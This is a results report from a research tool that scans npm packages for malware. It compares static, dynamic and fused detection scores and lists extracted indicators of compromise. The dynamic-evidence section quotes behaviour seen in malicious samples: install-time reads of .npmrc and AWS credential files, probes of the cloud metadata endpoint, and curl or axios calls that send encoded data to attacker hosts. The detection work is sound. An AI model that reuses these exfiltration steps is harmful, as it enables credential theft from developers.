@@ -1,0 +1,89 @@
+SAMPLE                                             STAT  DYN FUSED  VERDICT    NOTES
+2024-09-20-duckc2-api-v1.0.0                        100   50    70  malicious  
+2024-11-20-spid-gc-config-v5.1.4                     50   35    41  suspicious 
+2025-03-25-epic-comment-rating-v1.0.0                 0    0     0  low        inert (no behaviour in either stage)
+2025-05-25-blocks-nextjs-v9999.9999.10000            20   35    29  low        GAP: static-clean / dynamic-flagged
+2025-06-19-mattermost-hardware-keyboard-v1.0.0       60   35    45  suspicious 
+2025-07-08-tailwind-base-theme-v1.0.0                20   35    29  low        GAP: static-clean / dynamic-flagged
+2025-08-13-epc-node-web-client-v10.0.0               55   35    43  suspicious 
+2025-09-14-graphql-sequelize-teselagen-v5.3.8        40  100    80  malicious  CANARY-OVERRIDE
+2025-09-15-ng-imports-checker-v0.0.9                 30  100    80  malicious  CANARY-OVERRIDE; GAP: static-clean / dynamic-flagged
+2025-11-17-calculator-40ed-v4.0.0                   100   60    76  malicious  
+2025-12-18-npe-toolkit-server-deps-v1.0.0             0    0     0  low        inert (no behaviour in either stage)
+2026-01-28-monorepo-cop-v9.9.0                        0    0     0  low        inert (no behaviour in either stage)
+2026-05-19-echarts-for-react-v3.0.7                   0    0     0  low        inert (no behaviour in either stage)
+axios-1.20.0                                         60    0    24  low        GAP: static-flagged / dynamic-clean
+chalk-6.0.1                                           0    0     0  low        inert (no behaviour in either stage)
+debug-4.4.3                                          20    0     8  low        
+express-5.2.1                                        15    0     6  low        
+lodash-4.18.1                                        20    0     8  low        
+
+Malicious samples: 13 (4 inert, 9 with behaviour or code that did something)
+METHOD                                                          MALICIOUS FLAGGED   BENIGN FALSE POS
+Static only                                                            6/13 (46%)          1/5 (20%)
+Dynamic only                                                           9/13 (69%)           0/5 (0%)
+Fused score (0.4 static + 0.6 dynamic, canary override)                7/13 (54%)           0/5 (0%)
+Fused score + gap rule (dynamic-flagged gaps)                          9/13 (69%)           0/5 (0%)
+
+Gap findings: 4
+  2025-05-25-blocks-nextjs-v9999.9999.10000: static 20, dynamic 35  (static-clean / dynamic-flagged)
+  2025-07-08-tailwind-base-theme-v1.0.0: static 20, dynamic 35  (static-clean / dynamic-flagged)
+  2025-09-15-ng-imports-checker-v0.0.9: static 30, dynamic 100  (static-clean / dynamic-flagged)
+  axios-1.20.0: static 60, dynamic 0  (static-flagged / dynamic-clean)
+Samples that behaved differently between laptop and CI profiles: none
+
+IoCs extracted (unique values): connect_target=1, decoded_string=1, domain=32, ip=20, url=29
+
+ATTACKER-CONTROLLED INDICATORS (high confidence):
+  2024-11-20-spid-gc-config-v5.1.4           url             hxxps://discord[.]com/api/webhooks/1306068586086793297/<redacted>              [hardcoded-webhook]
+  2025-05-25-blocks-nextjs-v9999.9999.10000  domain          geyybafvoogqfnn3xmadws172y8pwskh[.]oastify[.]com                               [observed]
+  2025-06-19-mattermost-hardware-keyboard-v1 domain          bp4lqfam2mw2ha36kfd6ehcvemke84wt[.]oastify[.]com                               [observed]
+  2025-07-08-tailwind-base-theme-v1.0.0      url             hxxps://ip-check-server[.]vercel[.]app/api/ip-check/208                        [observed]
+  2025-07-08-tailwind-base-theme-v1.0.0      domain          ip-check-server[.]vercel[.]app                                                 [observed]
+  2025-08-13-epc-node-web-client-v10.0.0     domain          wvzo30h2[.]h1[.]ci                                                             [observed]
+  2025-08-13-epc-node-web-client-v10.0.0     decoded_string  hxxps://wvzo30h2[.]h1[.]ci:8843/                                               [decoded]
+  2025-11-17-calculator-40ed-v4.0.0          url             hxxps://vvucyl6abfnh5bv359d6kqiy4pahy9my[.]oastify[.]com/                      [observed]
+  2025-11-17-calculator-40ed-v4.0.0          domain          vvucyl6abfnh5bv359d6kqiy4pahy9my[.]oastify[.]com                               [observed]
+  2025-11-17-calculator-40ed-v4.0.0          url             hxxps://vvucyl6abfnh5bv359d6kqiy4pahy9my[.]oastify[.]com/UFJFVFRZX05BTUU9IkRlY [observed]
+  2025-11-17-calculator-40ed-v4.0.0          domain          betsh1pquv6xorejopwm361en5txho5d[.]oastify[.]com                               [observed]
+
+LEGITIMATE SERVICES CONTACTED (not blocklist material, shows what the sample targets):
+  2024-09-20-duckc2-api-v1.0.0               raw[.]githubusercontent[.]com
+  2024-11-20-spid-gc-config-v5.1.4           discord[.]com, ipinfo[.]io
+  2025-09-14-graphql-sequelize-teselagen-v5. 169[.]254[.]169[.]254:80, api[.]github[.]com, registry[.]npmjs[.]org, sts[.]us-east-1[.]amazonaws[.]com
+  2025-09-15-ng-imports-checker-v0.0.9       169[.]254[.]169[.]254:80, api[.]github[.]com, registry[.]npmjs[.]org, sts[.]us-east-1[.]amazonaws[.]com
+
+LOW-CONFIDENCE: 20 more domains and 20 IPs are only strings inside code (doc links, target or proxy lists). See iocs.csv. Triage before reporting.
+Low-confidence count per sample: {'2024-09-20-duckc2-api-v1.0.0': 57, '2025-09-14-graphql-sequelize-teselagen-v5.3.8': 2, '2025-09-15-ng-imports-checker-v0.0.9': 2, 'lodash-4.18.1': 2, '2024-11-20-spid-gc-config-v5.1.4': 1, '2025-11-17-calculator-40ed-v4.0.0': 1}
+
+DYNAMIC EVIDENCE (laptop profile, first two items per flag):
+  2024-09-20-duckc2-api-v1.0.0
+    RUNS_NPM: [import] npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys
+    DNS_LOOKUP: [import] dns server 127.0.0.1 | [import] query raw.githubusercontent.com
+    stubbed modules: axios
+  2024-11-20-spid-gc-config-v5.1.4
+    DNS_LOOKUP: [install] dns server 127.0.0.1 | [install] query ipinfo.io
+  2025-05-25-blocks-nextjs-v9999.9999.10000
+    DNS_LOOKUP: [import] dns server 127.0.0.1 | [import] query geyybafvoogqfnn3xmadws172y8pwskh.oastify.com
+  2025-06-19-mattermost-hardware-keyboard-v1.0.0
+    DNS_LOOKUP: [install] dns server 127.0.0.1 | [install] query bp4lqfam2mw2ha36kfd6ehcvemke84wt.oastify.com
+  2025-07-08-tailwind-base-theme-v1.0.0
+    NETWORK_INTENT: [import] CALL axios.post("https://ip-check-server.vercel.app/api/ip-check/208", {"USER":"d | [import] CALL axios.post("https://ip-check-server.vercel.app/api/ip-check/208", {"USER":"d
+    stubbed modules: axios, debug
+  2025-08-13-epc-node-web-client-v10.0.0
+    DNS_LOOKUP: [install] dns server 127.0.0.1 | [install] query wvzo30h2.h1.ci
+  2025-09-14-graphql-sequelize-teselagen-v5.3.8
+    CRED_ACCESS: [install] /home/dev/.npmrc | [install] /home/dev/.aws/credentials
+    DNS_LOOKUP: [install] dns server 127.0.0.1 | [install] query registry.npmjs.org
+    NETWORK_CONNECT: [install] 169.254.169.254:80
+    stubbed modules: bluebird, graphql, graphql-relay, graphql/language, lodash, lodash/camelCase
+  2025-09-15-ng-imports-checker-v0.0.9
+    CRED_ACCESS: [install] /home/dev/.npmrc | [install] /home/dev/.aws/credentials
+    DNS_LOOKUP: [install] dns server 127.0.0.1 | [install] query registry.npmjs.org
+    NETWORK_CONNECT: [install] 169.254.169.254:80
+    stubbed modules: chalk, glob, tslib
+  2025-11-17-calculator-40ed-v4.0.0
+    SUSPICIOUS_EXEC: [install] base64 -w0 | [install] curl https://vvucyl6abfnh5bv359d6kqiy4pahy9my.oastify.com/UFJFVFRZX05BTUU9IkRlYm
+    DNS_LOOKUP: [install] dns server 127.0.0.1 | [install] query betsh1pquv6xorejopwm361en5txho5d.oastify.com
+
+Saved fusion_results.csv, iocs.csv and review2_tables.md in /home/kali/npmshield/results
